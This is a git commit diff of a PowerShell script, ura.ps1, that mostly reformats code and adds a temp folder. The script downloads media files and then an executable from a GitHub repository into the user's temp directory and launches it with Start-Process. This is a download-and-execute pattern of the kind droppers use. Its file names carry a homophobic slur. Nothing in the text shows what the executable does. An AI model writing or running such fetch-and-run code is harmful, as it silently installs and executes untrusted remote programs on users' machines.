e66132752371e59bf632ec0d9ff66ed1cd78484c
Mikhail Chestneyshy <82827415+jostanise@users.noreply.github.com>
2022-12-12 19:25:25 +0300

    Update ura.ps1

--- ura.ps1
+++ ura.ps1
@@ -1,25 +1,22 @@
 $client = New-Object System.Net.WebClient
+$pathassets = $env:temp + "\assets"
+
+New-Item -ItemType Directory -Force -Path $pathassets 
 
 $file = $env:temp + "\assets\gays.mp3"
-
 if (Test-Path $file) {
   Remove-Item $file
   write-host "$file has been deleted"
 }
-else {
-  Write-host "$file doesn't exist"
-}
+else { Write-host "$file doesn't exist" }
 $client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/gayz.mp3", $file)
 
 $file = $env:temp + "\assets\ura.png"
-
 if (Test-Path $file) {
   Remove-Item $file
   write-host "$file has been deleted"
 }
-else {
-  Write-host "$file doesn't exist"
-}
+else { Write-host "$file doesn't exist" }
 $client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $file)
 
 $file = $env:temp + "\myexe.exe" 
@@ -27,9 +24,7 @@ if (Test-Path $file) {
   Remove-Item $file
   write-host "$file has been deleted"
 }
-else {
-  Write-host "$file doesn't exist"
-}
+else { Write-host "$file doesn't exist" }
 $client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $file)
 
 Start-Process -Filepath $file
